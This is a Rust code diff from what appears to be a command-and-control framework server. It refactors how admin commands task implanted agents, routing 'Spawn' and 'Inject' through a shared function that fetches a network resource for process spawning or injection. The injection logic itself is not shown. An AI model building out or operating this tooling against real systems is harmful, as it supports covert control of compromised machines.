@@ -3,7 +3,7 @@ use std::sync::Arc;
 use crate::{
     admin_task_dispatch::{
         delete_staged_resources, drop_file_handler,
-        execute::{dotex, spawn_inject_with_network_resource},
+        execute::{SpawnInject, dotex, spawn_inject_with_network_resource},
         export_completed_tasks_to_json,
         implant_builder::stage_file_upload_from_users_disk,
         list_agents, list_staged_resources, remove_agent_from_list, show_server_time, task_agent,
@@ -141,15 +141,24 @@ pub async fn admin_dispatch(
         AdminCommand::WhoAmI => {
             task_agent::<String>(Command::WhoAmI, None, uid.unwrap(), state).await
         }
-        AdminCommand::Spawn(inner) => {
-            spawn_inject_with_network_resource(uid, inner, state.clone()).await
+        AdminCommand::Spawn(download_name) => {
+            spawn_inject_with_network_resource(
+                uid,
+                SpawnInject::Spawn(download_name),
+                state.clone(),
+            )
+            .await
         }
         AdminCommand::StaticWof(name) => {
             task_agent::<String>(Command::StaticWof, Some(name), uid.unwrap(), state).await
         }
         AdminCommand::Inject(inject_inner) => {
-            let ser = serde_json::to_string(&inject_inner).unwrap();
-            task_agent::<String>(Command::StaticWof, Some(ser), uid.unwrap(), state).await
+            spawn_inject_with_network_resource(
+                uid,
+                SpawnInject::Inject(inject_inner),
+                state.clone(),
+            )
+            .await
         }
     };
 
